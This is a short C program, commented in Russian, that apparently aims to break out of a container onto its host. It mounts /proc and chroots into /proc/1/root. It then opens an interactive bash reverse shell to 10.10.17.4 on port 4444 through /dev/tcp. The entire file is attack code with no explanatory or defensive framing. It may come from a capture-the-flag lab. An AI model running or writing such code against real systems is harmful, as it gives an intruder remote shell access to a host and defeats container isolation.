#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    // Прыжок из контейнера на хост
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    
    // Наш IP и порт
    execl("/bin/bash", "bash", "-c",
    "bash -i >& /dev/tcp/10.10.17.4/4444 0>&1", NULL);
    return 1;
}
